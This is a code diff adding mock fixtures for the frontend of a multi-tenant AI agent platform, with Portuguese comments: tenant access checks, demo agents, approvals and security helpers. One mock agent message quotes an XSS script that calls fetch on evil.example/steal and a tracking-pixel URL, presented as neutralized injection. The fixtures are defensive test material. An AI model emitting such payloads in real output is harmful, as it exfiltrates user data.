+    email: "roberto.sre@nucleos-platform.example",
+    platformRole: "platform_admin",
+    mfaVerified: true,
+    authorizedOrgSlugs: ["aurora-industrial", "vereda-logistica"],
+  },
+];
+
+/**
+ * Valida acesso de sessao ao slug de organizacao solicitado (WEB-001 AC-2).
+ * Se o usuario nao pertencer a organizacao (ex.: "titan-defesa"), retorna 404
+ * sem expor nenhum dado da organizacao B.
+ */
+export function resolveTenantRouteAccess(
+  actor: MockSessionActor | null,
+  requestedOrgSlug: string,
+): TenantRouteResolution {
+  if (!actor || !actor.mfaVerified) {
+    return {
+      allowed: false,
+      httpStatus: 401,
+      organization: null,
+      safeMessage: "Sessão não autenticada ou desafio MFA pendente. Redirecionando para /login.",
+    };
+  }
+
+  const normalizedSlug = requestedOrgSlug.trim().toLowerCase();
+  const isMember = actor.authorizedOrgSlugs.includes(normalizedSlug);
+
+  if (!isMember) {
+    return {
+      allowed: false,
+      httpStatus: 404,
+      organization: null,
+      safeMessage:
+        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
+    };
+  }
+
+  const org = getMockOrganizationBySlug(normalizedSlug);
+  if (org.slug !== normalizedSlug) {
+    return {
+      allowed: false,
+      httpStatus: 404,
+      organization: null,
+      safeMessage:
+        "Recurso ou organização não encontrada (HTTP 404). Nenhum metadado de terceiros é revelado.",
+    };
+  }
+
+  return {
+    allowed: true,
+    httpStatus: 200,
+    organization: org,
+    safeMessage: "Acesso autorizado à organização ativa.",
+  };
+}
+
+export const MOCK_ORG_MEMBERS: readonly MockOrgMember[] = [
+  {
+    id: "mem-01",
+    name: "Marina Costa",
+    email: "marina.costa@aurora-demo.example",
+    role: "org_admin",
+    mfaEnabled: true,
+    lastSeenLabel: "Online agora",
+  },
+  {
+    id: "mem-02",
+    name: "Eduardo Nogueira",
+    email: "eduardo.fin@aurora-demo.example",
+    role: "department_manager",
+    mfaEnabled: true,
+    lastSeenLabel: "há 14 min",
+  },
+  {
+    id: "mem-03",
+    name: "Patrícia Lemos",
+    email: "patricia.jur@aurora-demo.example",
+    role: "operator",
+    mfaEnabled: true,
+    lastSeenLabel: "há 42 min",
+  },
+  {
+    id: "mem-04",
+    name: "Carlos Mendes",
+    email: "carlos.auditoria@aurora-demo.example",
+    role: "viewer",
+    mfaEnabled: true,
+    lastSeenLabel: "ontem às 18:10",
+  },
+];
+
+export const MOCK_ENTITLEMENTS: readonly MockEntitlementModule[] = [
+  {
+    moduleCode: "MOD-FIN-CORE",
+    name: "Finanças & Controladoria",
+    maxAgents: 4,
+    activeAgents: 2,
+    monthlyQuotaTokens: 5000000,
+    status: "ACTIVE",
+  },
+  {
+    moduleCode: "MOD-JUR-LGPD",
+    name: "Jurídico & Privacidade LGPD",
+    maxAgents: 3,
+    activeAgents: 2,
+    monthlyQuotaTokens: 4000000,
+    status: "ACTIVE",
+  },
+  {
+    moduleCode: "MOD-OPS-SUPPLY",
+    name: "Operações & Suprimentos",
+    maxAgents: 4,
+    activeAgents: 2,
+    monthlyQuotaTokens: 3500000,
+    status: "ACTIVE",
+  },
+  {
+    moduleCode: "MOD-CX-FRONT",
+    name: "Recepção & Triagem Digital",
+    maxAgents: 2,
+    activeAgents: 1,
+    monthlyQuotaTokens: 2500000,
+    status: "ACTIVE",
+  },
+];
+
+export const MOCK_INTEGRATIONS: readonly MockIntegrationMetadata[] = [
+  {
+    id: "int-sap-01",
+    name: "ERP Industrial (Conector HTTP Seguro)",
+    category: "ERP / Financeiro",
+    egressDomain: "api.erp-homologado.aurora.example",
+    credentialVaultRef: "vault://tenant-aurora/erp-oauth-client (redigido)",
+    status: "HEALTHY",
+  },
+  {
+    id: "int-sefaz-02",
+    name: "Validador NFe / Manifesto Fiscal",
+    category: "Fiscal",
+    egressDomain: "nfe.fazenda.gov.br",
+    credentialVaultRef: "vault://tenant-aurora/cert-a1-mtls (redigido)",
+    status: "HEALTHY",
+  },
+  {
+    id: "int-webhook-03",
+    name: "Domínio Externo Não Catalogado",
+    category: "Bloqueio de Egress (TGW-005)",
+    egressDomain: "untrusted-webhook.external.example",
+    credentialVaultRef: "Nenhuma credencial associada",
+    status: "BLOCKED_BY_POLICY",
+  },
+];
+
+export const MOCK_RAG_DOCUMENTS: readonly MockRagDocument[] = [
+  {
+    id: "doc-rag-01",
+    title: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
+    departmentName: "Finanças & Controladoria",
+    status: "INDEXED",
+    chunksCount: 42,
+    updatedAtLabel: "2026-10-28 09:15",
+  },
+  {
+    id: "doc-rag-02",
+    title: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
+    departmentName: "Jurídico & Privacidade LGPD",
+    status: "INDEXED",
+    chunksCount: 68,
+    updatedAtLabel: "2026-10-29 16:40",
+  },
+  {
+    id: "doc-rag-03",
+    title: "Tabela_Frete_Sul_Q4_2026.csv",
+    departmentName: "Operações & Suprimentos",
+    status: "INDEXING",
+    chunksCount: 19,
+    updatedAtLabel: "há 6 min",
+  },
+  {
+    id: "doc-rag-04",
+    title: "Anexo_Externo_Com_Instrucao_Suspeita.txt",
+    departmentName: "Recepção & Triagem Digital",
+    status: "QUARANTINED_INJECTION",
+    chunksCount: 0,
+    updatedAtLabel: "Retido pela defesa RAG-003 / TGW-006",
+  },
+];
+
+export const MOCK_AGENT_CONVERSATIONS: readonly MockAgentConversation[] = [
+  {
+    agentId: "agt-fin-01",
+    agentName: "Helena (Conciliação)",
+    departmentName: "Finanças & Controladoria",
+    modelName: "claude-3-7-sonnet",
+    messages: [
+      {
+        id: "msg-01",
+        sender: "user",
+        authorLabel: "Marina Costa",
+        timestampLabel: "14:12",
+        rawContent:
+          "Helena, confira se os 6 boletos do lote BR-442 possuem nota fiscal validada e se o valor bate com a alçada.",
+        toolSteps: [],
+        citations: [],
+        costTokens: 180,
+      },
+      {
+        id: "msg-02",
+        sender: "agent",
+        authorLabel: "Helena (Conciliação)",
+        timestampLabel: "14:13",
+        rawContent:
+          "Conferi os 6 documentos fiscais do lote BR-442. Todos possuem chave NFe ativa e somam R$ 48.200,00.\n`SELECT lote, total_brl, status_nfe FROM conciliacao_outubro WHERE lote = 'BR-442'`\nComo o total supera R$ 25.000,00, a Política de Alçadas exige aprovação humana explícita no painel HITL antes da emissão bancária.",
+        toolSteps: [
+          {
+            stepId: "stp-01",
+            toolName: "tenant_db.query_readonly_invoices",
+            policyDecision: "ALLOW",
+            durationMs: 84,
+            summary: "Leitura de 6 notas fiscais homologadas no schema do tenant",
+          },
+          {
+            stepId: "stp-02",
+            toolName: "erp_connector.schedule_payment_batch",
+            policyDecision: "REQUIRE_APPROVAL",
+            durationMs: 19,
+            summary: "Retido pelo Tool Gateway: valor acima de R$ 25.000 exige aprovação #apr-301",
+          },
+        ],
+        citations: [
+          {
+            documentId: "doc-rag-01",
+            documentTitle: "Política de Alçadas e Pagamentos Industriais v4.2.pdf",
+            sectionLabel: "Seção 3.2 — Dupla aprovação acima de R$ 25 mil",
+          },
+        ],
+        costTokens: 1420,
+      },
+    ],
+  },
+  {
+    agentId: "agt-jur-01",
+    agentName: "Clara (Minutas)",
+    departmentName: "Jurídico & Privacidade LGPD",
+    modelName: "claude-3-7-sonnet",
+    messages: [
+      {
+        id: "msg-10",
+        sender: "user",
+        authorLabel: "Patrícia Lemos",
+        timestampLabel: "13:45",
+        rawContent:
+          "Clara, o anexo enviado pela transportadora externa tinha algum trecho suspeito?",
+        toolSteps: [],
+        citations: [],
+        costTokens: 140,
+      },
+      {
+        id: "msg-11",
+        sender: "agent",
+        authorLabel: "Clara (Minutas)",
+        timestampLabel: "13:46",
+        rawContent:
+          "Detectei tentativa de injeção e rastreamento externo no documento bruto que foi neutralizada pela camada WEB-008:\n<script>fetch('https://evil.example/steal')</script>\n![pixel-rastreamento](https://tracker.evil.example/pixel.png?tenant=aurora)\nRecomendo manter apenas a minuta padrão com retenção de 30 dias.",
+        toolSteps: [
+          {
+            stepId: "stp-10",
+            toolName: "rag_search.clauses_dpa",
+            policyDecision: "ALLOW",
+            durationMs: 62,
+            summary: "Recuperação híbrida de cláusulas LGPD do tenant",
+          },
+        ],
+        citations: [
+          {
+            documentId: "doc-rag-02",
+            documentTitle: "Manual de Cláusulas Padrão DPA e Suboperadores LGPD.docx",
+            sectionLabel: "Cláusula 7 — Vedação de exfiltração e retenção",
+          },
+        ],
+        costTokens: 980,
+      },
+    ],
+  },
+];
+
+export function generateOrganizationUsageCsv(orgSlug: string): string {
+  const org = getMockOrganizationBySlug(orgSlug);
+  const rows: DepartmentUsageCsvRow[] = org.floors.flatMap((floor) =>
+    floor.agents.map((agent) => ({
+      organizationSlug: org.slug,
+      departmentName: floor.name,
+      moduleCode: floor.moduleCode,
+      agentName: agent.name,
+      modelName: agent.modelName,
+      tokensUsedMonth: agent.tokensUsedMonth,
+      tokensLimitMonth: agent.tokensLimitMonth,
+      monthlySpentBrl: floor.monthlySpentBrl,
+      monthlyBudgetBrl: floor.monthlyBudgetBrl,
+    })),
+  );
+  return buildOrganizationUsageCsv(rows);
+}
+
+const MOCK_PLATFORM_TENANTS: readonly MockPlatformTenantMetadata[] = [
+  {
+    tenantId: "tnt-01-aurora",
+    slug: "aurora-industrial",
+    state: "ACTIVE",
+    monthlyCostBrl: 11000,
+    monthlyCapBrl: 15000,
+    killSwitchActive: false,
+    reconcilerDrift: "NONE",
+    activeContainers: 4,
+  },
+  {
+    tenantId: "tnt-02-vereda",
+    slug: "vereda-logistica",
+    state: "PROVISIONING",
+    monthlyCostBrl: 1050,
+    monthlyCapBrl: 5000,
+    killSwitchActive: false,
+    reconcilerDrift: "NONE",
+    activeContainers: 2,
+  },
+  {
+    tenantId: "tnt-03-horizonte",
+    slug: "horizonte-saude",
+    state: "ACTIVE",
+    monthlyCostBrl: 3800,
+    monthlyCapBrl: 6000,
+    killSwitchActive: false,
+    reconcilerDrift: "NONE",
+    activeContainers: 4,
+  },
+  {
+    tenantId: "tnt-04-atlas",
+    slug: "atlas-energia",
+    state: "ACTIVE",
+    monthlyCostBrl: 8900,
+    monthlyCapBrl: 9000,
+    killSwitchActive: false,
+    reconcilerDrift: "MINOR_DRIFT",
+    activeContainers: 4,
+  },
+  {
+    tenantId: "tnt-05-vanguarda",
+    slug: "vanguarda-agro",
+    state: "SUSPENDED",
+    monthlyCostBrl: 0,
+    monthlyCapBrl: 4000,
+    killSwitchActive: true,
+    reconcilerDrift: "NONE",
+    activeContainers: 0,
+  },
+];
+
+const MOCK_PROVISIONING_RUNS: readonly MockProvisioningExecution[] = [
+  {
+    executionId: "PRV-2026-0042",
+    tenantSlug: "vereda-logistica",
+    currentStep: "Passo 4/5: Smoke de saúde da Tenant API e isolamento de rede",
+    status: "IN_PROGRESS",
+    stepsCompleted: 4,
+    totalSteps: 5,
+    updatedAtLabel: "há 2 min",
+  },
+  {
+    executionId: "PRV-2026-0041",
+    tenantSlug: "aurora-industrial",
+    currentStep: "Passo 5/5: Ativação concluída e reconciliador em conformidade",
+    status: "COMPLETED",
+    stepsCompleted: 5,
+    totalSteps: 5,
+    updatedAtLabel: "2026-10-25 11:00",
+  },
+];
+
+const MOCK_DLQ_ITEMS: readonly MockDlqItem[] = [
+  {
+    jobId: "dlq-job-9081",
+    tenantSlug: "atlas-energia",
+    queueName: "tenant.ai.completions",
+    failureCode: "OPENROUTER_UPSTREAM_502_EXHAUSTED",
+    retriesCount: 5,
+    occurredAtLabel: "há 19 min",
+  },
+  {
+    jobId: "dlq-job-9074",
+    tenantSlug: "aurora-industrial",
+    queueName: "tenant.webhooks.outbound",
+    failureCode: "EGRESS_TIMEOUT_AFTER_3_RETRIES",
+    retriesCount: 3,
+    occurredAtLabel: "há 1h 05min",
+  },
+];
+
+const MOCK_BREAK_GLASS_GRANTS: readonly MockBreakGlassGrant[] = [
+  {
+    grantId: "bg-2026-07",
+    tenantSlug: "atlas-energia",
+    requestedBy: "roberto.sre@nucleos-platform.example",
+    reason:
+      "Investigar alerta MINOR_DRIFT na cota de PIDs do container runtime sem acessar banco ou conversas.",
+    status: "ACTIVE_READONLY_METADATA",
+    expiresAtLabel: "Expira em 22 min (TTL máx 60 min)",
+  },
+];
+
+/**
+ * Resolve visao do Backoffice de Plataforma (/platform — WEB-009).
+ * Bloqueia com 403 qualquer ator que nao seja `platform_admin` com MFA verificado.
+ */
+export function resolvePlatformBackoffice(
+  actor: MockSessionActor | null,
+): PlatformBackofficeViewModel {
+  if (!actor || actor.platformRole !== "platform_admin" || !actor.mfaVerified) {
+    return {
+      allowed: false,
+      httpStatus: 403,
+      denialReason:
+        "Acesso negado (HTTP 403): A área /platform é exclusiva para operadores com papel platform_admin e MFA ativo. Usuários de tenant não possuem permissão.",
+      hostCapacity: {
+        vpsNodeLabel: "indisponivel",
+        activeTenantsCount: 0,
+        maxTenantsMvp: 5,
+        cpuUsagePct: 0,
+        ramUsedGb: 0,
+        ramTotalGb: 0,
+        diskUsedPct: 0,
+      },
+      tenants: [],
+      provisioningRuns: [],
+      dlqItems: [],
+      breakGlassGrants: [],
+    };
+  }
+
+  return {
+    allowed: true,
+    httpStatus: 200,
+    denialReason: null,
+    hostCapacity: {
+      vpsNodeLabel: "vps-mvp-saopaulo-01 (Isolamento Docker + Redes por Tenant)",
+      activeTenantsCount: 4,
+      maxTenantsMvp: 5,
+      cpuUsagePct: 58,
+      ramUsedGb: 19.4,
+      ramTotalGb: 32,
+      diskUsedPct: 44,
+    },
+    tenants: MOCK_PLATFORM_TENANTS,
+    provisioningRuns: MOCK_PROVISIONING_RUNS,
+    dlqItems: MOCK_DLQ_ITEMS,
+    breakGlassGrants: MOCK_BREAK_GLASS_GRANTS,
+  };
+}
diff --git a/apps/web/lib/mock-fixtures.ts b/apps/web/lib/mock-fixtures.ts
new file mode 100644
index 0000000..276ee56
--- /dev/null
+++ b/apps/web/lib/mock-fixtures.ts
@@ -0,0 +1,443 @@
+import type { MockOrganizationFixture } from "./mock-types.ts";
+
+export const DEMO_ENVIRONMENT_BANNER =
+  "AMBIENTE DE DEMONSTRAÇÃO (MOCK LOCAL — LOC-WEB-001): Todos os dados exibidos vêm de fixtures TypeScript estáticas. Autenticação real, Control Plane, SSE e chamadas de rede estão desativados.";
+
+export const MOCK_ORGANIZATIONS: readonly MockOrganizationFixture[] = [
+  {
+    id: "org-aurora-01",
+    slug: "aurora-industrial",
+    displayName: "Aurora Industrial",
+    legalName: "Aurora Equipamentos Industriais S.A.",
+    planName: "Enterprise Multi-Departamento",
+    tenantState: "ACTIVE",
+    activeRole: "org_admin",
+    activeUserLabel: "Marina Costa (Admin da Organização)",
+    lastSyncLabel: "Fixture determinística · 2026-10-30 14:20 BRT",
+    securityBanner:
+      "Último evento relevante do tenant: bloqueio preventivo de conector externo não catalogado há 2h (sem exfiltração).",
+    simulatedError: {
+      code: "TENANT_RUNTIME_UNAVAILABLE",
+      httpStatus: 503,
+      title: "Falha temporária ao carregar leitura agregada da organização",
+      userMessage:
+        "Não foi possível sincronizar o estado operacional dos departamentos neste momento. Nenhuma ação pendente foi executada.",
+      correlationId: "corr-demo-9f41a8c2-001",
+      retryable: true,
+    },
+    floors: [
+      {
+        id: "floor-fin-04",
+        slug: "financas-controladoria",
+        name: "Finanças & Controladoria",
+        floorNumber: 4,
+        moduleCode: "MOD-FIN-CORE",
+        summary:
+          "Conciliação contábil, previsão de fluxo de caixa e auditoria de faturas com aprovação humana obrigatória acima da alçada.",
+        monthlyBudgetBrl: 5000,
+        monthlySpentBrl: 4250,
+        tokensUsedMonth: 4250000,
+        tokensLimitMonth: 5000000,
+        agents: [
+          {
+            id: "agt-fin-01",
+            code: "FIN-conciliador",
+            name: "Helena (Conciliação)",
+            roleTitle: "Agente de Conciliação Bancária",
+            departmentId: "floor-fin-04",
+            departmentName: "Finanças & Controladoria",
+            floorNumber: 4,
+            workstationCode: "4A-01",
+            status: "executing",
+            modelName: "claude-3-7-sonnet",
+            currentTaskSummary:
+              "Conferindo 48 lançamentos do lote bancário de outubro contra notas fiscais.",
+            tokensUsedMonth: 2300000,
+            tokensLimitMonth: 2500000,
+          },
+          {
+            id: "agt-fin-02",
+            code: "FIN-tesouraria",
+            name: "Breno (Tesouraria)",
+            roleTitle: "Agente de Programação de Pagamentos",
+            departmentId: "floor-fin-04",
+            departmentName: "Finanças & Controladoria",
+            floorNumber: 4,
+            workstationCode: "4A-02",
+            status: "awaiting_approval",
+            modelName: "gpt-4.1",
+            currentTaskSummary:
+              "Aguardando aprovação humana para liberar borderô de fornecedores críticos.",
+            tokensUsedMonth: 1950000,
+            tokensLimitMonth: 2500000,
+          },
+        ],
+      },
+      {
+        id: "floor-jur-03",
+        slug: "juridico-compliance",
+        name: "Jurídico & Privacidade LGPD",
+        floorNumber: 3,
+        moduleCode: "MOD-JUR-LGPD",
+        summary:
+          "Análise de minutas contratuais, verificação de cláusulas de proteção de dados e triagem de solicitações de titulares.",
+        monthlyBudgetBrl: 4000,
+        monthlySpentBrl: 2100,
+        tokensUsedMonth: 2100000,
+        tokensLimitMonth: 4000000,
+        agents: [
+          {
+            id: "agt-jur-01",
+            code: "JUR-contratos",
+            name: "Clara (Minutas)",
+            roleTitle: "Agente Revisor de Contratos B2B",
+            departmentId: "floor-jur-03",
+            departmentName: "Jurídico & Privacidade LGPD",
+            floorNumber: 3,
+            workstationCode: "3B-01",
+            status: "awaiting_approval",
+            modelName: "claude-3-7-sonnet",
+            currentTaskSummary:
+              "Parecer de aditivo DPA pronto; requer aceite jurídico antes de envio.",
+            tokensUsedMonth: 1400000,
+            tokensLimitMonth: 2500000,
+          },
+          {
+            id: "agt-jur-02",
+            code: "JUR-dpo",
+            name: "Davi (Governança LGPD)",
+            roleTitle: "Agente de Inventário ROPA",
+            departmentId: "floor-jur-03",
+            departmentName: "Jurídico & Privacidade LGPD",
+            floorNumber: 3,
+            workstationCode: "3B-02",
+            status: "idle",
+            modelName: "gpt-4.1-mini",
+            currentTaskSummary: "Sem jobs ativos; última revisão de retenção concluída há 35 min.",
+            tokensUsedMonth: 700000,
+            tokensLimitMonth: 1500000,
+          },
+        ],
+      },
+      {
+        id: "floor-ops-02",
+        slug: "operacoes-suprimentos",
+        name: "Operações & Suprimentos",
+        floorNumber: 2,
+        moduleCode: "MOD-OPS-SUPPLY",
+        summary:
+          "Monitoramento de estoque de segurança, cotação automatizada e acompanhamento de SLA de entregas industriais.",
+        monthlyBudgetBrl: 3500,
+        monthlySpentBrl: 3500,
+        tokensUsedMonth: 3500000,
+        tokensLimitMonth: 3500000,
+        agents: [
+          {
+            id: "agt-ops-01",
+            code: "OPS-compras",
+            name: "Ícaro (Suprimentos)",
+            roleTitle: "Agente de Ressuprimento e Cotações",
+            departmentId: "floor-ops-02",
+            departmentName: "Operações & Suprimentos",
+            floorNumber: 2,
+            workstationCode: "2C-01",
+            status: "degraded",
+            modelName: "gpt-4.1",
+            currentTaskSummary:
+              "Pausado por teto de orçamento mensal atingido (100% da cota do andar).",
+            tokensUsedMonth: 2200000,
+            tokensLimitMonth: 2200000,
+          },
+          {
+            id: "agt-ops-02",
+            code: "OPS-logistica",
+            name: "Lívia (Roteirização)",
+            roleTitle: "Agente de Auditoria de Frete",
+            departmentId: "floor-ops-02",
+            departmentName: "Operações & Suprimentos",
+            floorNumber: 2,
+            workstationCode: "2C-02",
+            status: "executing",
+            modelName: "gpt-4.1-mini",
+            currentTaskSummary:
+              "Consolidando divergências de cubagem do centro de distribuição Sul.",
+            tokensUsedMonth: 1300000,
+            tokensLimitMonth: 1300000,
+          },
+        ],
+      },
+      {
+        id: "floor-atd-01",
+        slug: "atendimento-recepcao",
+        name: "Térreo · Recepção & Triagem Digital",
+        floorNumber: 1,
+        moduleCode: "MOD-CX-FRONT",
+        summary:
+          "Porta de entrada do edifício: classifica demandas recebidas e encaminha para o departamento responsável com rastreabilidade.",
+        monthlyBudgetBrl: 2500,
+        monthlySpentBrl: 1150,
+        tokensUsedMonth: 1150000,
+        tokensLimitMonth: 2500000,
+        agents: [
+          {
+            id: "agt-atd-01",
+            code: "CX-recepcao",
+            name: "Nora (Recepção)",
+            roleTitle: "Agente de Triagem e Roteamento",
+            departmentId: "floor-atd-01",
+            departmentName: "Térreo · Recepção & Triagem Digital",
+            floorNumber: 1,
+            workstationCode: "1T-01",
+            status: "executing",
+            modelName: "gpt-4.1-mini",
+            currentTaskSummary:
+              "Classificando 12 protocolos técnicos e direcionando ao 2º e 4º andares.",
+            tokensUsedMonth: 1150000,
+            tokensLimitMonth: 2500000,
+          },
+        ],
+      },
+    ],
+    tasks: [
+      {
+        id: "tsk-101",
+        code: "JOB-2026-0891",
+        title: "Conciliação de extratos CNAB 240 — Outubro/2026",
+        departmentId: "floor-fin-04",
+        departmentName: "Finanças & Controladoria",
+        agentName: "Helena (Conciliação)",
+        status: "running",
+        startedAtLabel: "há 4 min",
+        durationLabel: "04m 12s",
+      },
+      {
+        id: "tsk-102",
+        code: "JOB-2026-0890",
+        title: "Emissão de borderô de fornecedores homologados",
+        departmentId: "floor-fin-04",
+        departmentName: "Finanças & Controladoria",
+        agentName: "Breno (Tesouraria)",
+        status: "awaiting_human",
+        startedAtLabel: "há 18 min",
+        durationLabel: "aguardando decisão",
+      },
+      {
+        id: "tsk-103",
+        code: "JOB-2026-0888",
+        title: "Revisão de cláusulas de suboperadores em aditivo DPA",
+        departmentId: "floor-jur-03",
+        departmentName: "Jurídico & Privacidade LGPD",
+        agentName: "Clara (Minutas)",
+        status: "awaiting_human",
+        startedAtLabel: "há 27 min",
+        durationLabel: "aguardando decisão",
+      },
+      {
+        id: "tsk-104",
+        code: "JOB-2026-0885",
+        title: "Auditoria de tabelas de frete rodoviário Q4",
+        departmentId: "floor-ops-02",
+        departmentName: "Operações & Suprimentos",
+        agentName: "Lívia (Roteirização)",
+        status: "queued",
+        startedAtLabel: "na fila há 2 min",
+        durationLabel: "prioridade normal",
+      },
+    ],
+    approvals: [
+      {
+        id: "apr-301",
+        actionHash: "sha256:7c9e2b4d...f102a8",
+        title: "Autorizar envio de borderô de pagamento #BR-442",
+        serverSummary:
+          "Pagamento programado de 6 notas fiscais conferidas para fornecedores industriais já homologados, totalizando R$ 48.200,00.",
+        departmentName: "Finanças & Controladoria",
+        agentName: "Breno (Tesouraria)",
+        riskLevel: "high",
+        expiresInLabel: "Expira em 45 min",
+        argumentsPreview:
+          '{"lote":"BR-442","documentos":6,"valorTotalBrl":48200,"contaOrigem":"Banco-001-Operacional"}',
+        requiredPermission: "approvals:decide",
+      },
+      {
+        id: "apr-302",
+        actionHash: "sha256:3a11e90c...88b4d1",
+        title: "Aprovar minuta revisada de DPA para parceiro logístico",
+        serverSummary:
+          "Minuta padrão com cláusula de retenção máxima de 30 dias e vedação de uso para treinamento de modelos externos.",
+        departmentName: "Jurídico & Privacidade LGPD",
+        agentName: "Clara (Minutas)",
+        riskLevel: "medium",
+        expiresInLabel: "Expira em 3h 10min",
+        argumentsPreview:
+          '{"documento":"DPA-2026-19","retencaoDias":30,"suboperadoresAutorizados":2}',
+        requiredPermission: "approvals:decide",
+      },
+    ],
+    recentActivity: [
+      {
+        id: "act-501",
+        timestampLabel: "14:15 BRT",
+        eventCode: "AIG_BUDGET_THRESHOLD_100",
+        summary:
+          "Departamento Operações & Suprimentos atingiu 100% do orçamento mensal de IA; novas execuções não prioritárias foram retidas.",
+        actorLabel: "AI Gateway (política de cota)",
+        severity: "high",
+        correlationId: "corr-aig-88210a",
+      },
+      {
+        id: "act-502",
+        timestampLabel: "13:52 BRT",
+        eventCode: "TGW_EGRESS_DENIED",
+        summary:
+          "Tentativa de chamada HTTP para domínio fora da allowlist do tenant bloqueada pelo Tool Gateway.",
+        actorLabel: "Tool Gateway (agt-ops-01)",
+        severity: "warning",
+        correlationId: "corr-tgw-77104b",
+      },
+      {
+        id: "act-503",
+        timestampLabel: "13:30 BRT",
+        eventCode: "AIG_BUDGET_THRESHOLD_80",
+        summary:
+          "Departamento Finanças & Controladoria ultrapassou 80% do orçamento mensal (85% utilizado).",
+        actorLabel: "AI Gateway (metering)",
+        severity: "warning",
+        correlationId: "corr-aig-61902c",
+      },
+      {
+        id: "act-504",
+        timestampLabel: "12:40 BRT",
+        eventCode: "RUN_APPROVAL_REQUESTED",
+        summary: "Agente Breno (Tesouraria) registrou pedido de aprovação humana durável #apr-301.",
+        actorLabel: "Tenant Runtime",
+        severity: "info",
+        correlationId: "corr-run-50411d",
+      },
+    ],
+  },
+  {
+    id: "org-vereda-02",
+    slug: "vereda-logistica",
+    displayName: "Vereda Logística",
+    legalName: "Vereda Operações Logísticas Ltda.",
+    planName: "Business · Em Provisionamento",
+    tenantState: "PROVISIONING",
+    activeRole: "viewer",
+    activeUserLabel: "Carlos Mendes (Leitor / Auditoria)",
+    lastSyncLabel: "Fixture determinística · 2026-10-30 14:18 BRT",
+    securityBanner: null,
+    simulatedError: {
+      code: "CONTROL_PLANE_TIMEOUT",
+      httpStatus: 504,
+      title: "Tempo limite ao consultar provisionamento da organização",
+      userMessage:
+        "A consulta de status do ambiente demorou mais que o esperado. Tente novamente em instantes ou informe o código de correlação ao suporte.",
+      correlationId: "corr-demo-4b19d2e0-002",
+      retryable: true,
+    },
+    floors: [
+      {
+        id: "floor-ver-02",
+        slug: "torre-controle-frete",
+        name: "Torre de Controle de Frota",
+        floorNumber: 2,
+        moduleCode: "MOD-LOG-TOWER",
+        summary:
+          "Andar em construção (PROVISIONING): preparação de agentes de rastreamento e janelas de descarga.",
+        monthlyBudgetBrl: 3000,
+        monthlySpentBrl: 450,
+        tokensUsedMonth: 450000,
+        tokensLimitMonth: 3000000,
+        agents: [
+          {
+            id: "agt-ver-01",
+            code: "LOG-janela",
+            name: "Otto (Docas)",
+            roleTitle: "Agente de Agendamento de Pátio",
+            departmentId: "floor-ver-02",
+            departmentName: "Torre de Controle de Frota",
+            floorNumber: 2,
+            workstationCode: "2A-01",
+            status: "idle",
+            modelName: "gpt-4.1-mini",
+            currentTaskSummary:
+              "Ambiente do tenant em etapa final de ativação; aguardando liberação de tráfego.",
+            tokensUsedMonth: 450000,
+            tokensLimitMonth: 3000000,
+          },
+        ],
+      },
+      {
+        id: "floor-ver-01",
+        slug: "recepcao-embarcadores",
+        name: "Térreo · Recepção de Embarcadores",
+        floorNumber: 1,
+        moduleCode: "MOD-CX-FRONT",
+        summary: "Triagem de conhecimentos de transporte (CT-e) e avisos de sinistro.",
+        monthlyBudgetBrl: 2000,
+        monthlySpentBrl: 600,
+        tokensUsedMonth: 600000,
+        tokensLimitMonth: 2000000,
+        agents: [
+          {
+            id: "agt-ver-02",
+            code: "LOG-cte",
+            name: "Sofia (Triagem CT-e)",
+            roleTitle: "Agente de Validação Documental",
+            departmentId: "floor-ver-01",
+            departmentName: "Térreo · Recepção de Embarcadores",
+            floorNumber: 1,
+            workstationCode: "1T-01",
+            status: "awaiting_approval",
+            modelName: "claude-3-7-sonnet",
+            currentTaskSummary:
+              "Divergência de CNPJ em manifesto #CT-902 aguarda validação de operador autorizado.",
+            tokensUsedMonth: 600000,
+            tokensLimitMonth: 2000000,
+          },
+        ],
+      },
+    ],
+    tasks: [
+      {
+        id: "tsk-201",
+        code: "JOB-2026-0310",
+        title: "Validação de manifesto de carga fracionada #CT-902",
+        departmentId: "floor-ver-01",
+        departmentName: "Térreo · Recepção de Embarcadores",
+        agentName: "Sofia (Triagem CT-e)",
+        status: "awaiting_human",
+        startedAtLabel: "há 11 min",
+        durationLabel: "aguardando operador",
+      },
+    ],
+    approvals: [
+      {
+        id: "apr-401",
+        actionHash: "sha256:9d04a11b...c72e19",
+        title: "Liberar reprocessamento de CT-e com ressalva fiscal",
+        serverSummary:
+          "Solicitação requer papel com permissão approvals:decide; seu papel atual (viewer) permite apenas leitura e auditoria.",
+        departmentName: "Térreo · Recepção de Embarcadores",
+        agentName: "Sofia (Triagem CT-e)",
+        riskLevel: "medium",
+        expiresInLabel: "Expira em 2h",
+        argumentsPreview: '{"cte":"902","ufOrigem":"SP","ufDestino":"PR"}',
+        requiredPermission: "approvals:decide",
+      },
+    ],
+    recentActivity: [
+      {
+        id: "act-601",
+        timestampLabel: "14:10 BRT",
+        eventCode: "PRV_STEP_NETWORK_READY",
+        summary:
+          "Rede isolada do tenant verificada; edifício em modo de pré-ativação (PROVISIONING).",
+        actorLabel: "Tenant Provisioner",
+        severity: "info",
+        correlationId: "corr-prv-11029f",
+      },
+    ],
+  },
+];
diff --git a/apps/web/lib/mock-security.ts b/apps/web/lib/mock-security.ts
new file mode 100644
index 0000000..bd902a4
--- /dev/null
+++ b/apps/web/lib/mock-security.ts
@@ -0,0 +1,179 @@
+/**
+ * Utilitarios puros de seguranca do frontend e prevencao de duplicidade (WEB-002 e WEB-008).
+ *
+ * - Sanitizacao deterministica de texto/markdown vindo de agentes (sem dangerouslySetInnerHTML).
+ * - Bloqueio automatico de imagens remotas em respostas de agentes (evita exfiltracao por URL).
+ * - Guard de idempotencia contra duplo clique em mutacoes criticas.
+ * - Exportacao CSV de consumo de IA com neutralizacao de CSV Formula Injection.
+ */
+
+export interface SafeMessageSegment {
+  readonly kind: "text" | "code" | "safe_link" | "blocked_xss" | "blocked_remote_image";
+  readonly content: string;
+  readonly href?: string;
+}
+
+export interface SanitizedAgentOutput {
+  readonly safeSegments: readonly SafeMessageSegment[];
+  readonly blockedXssCount: number;
+  readonly blockedRemoteImages: readonly string[];
+}
+
+export interface DepartmentUsageCsvRow {
+  readonly organizationSlug: string;
+  readonly departmentName: string;
+  readonly moduleCode: string;
+  readonly agentName: string;
+  readonly modelName: string;
+  readonly tokensUsedMonth: number;
+  readonly tokensLimitMonth: number;
+  readonly monthlySpentBrl: number;
+  readonly monthlyBudgetBrl: number;
+}
+
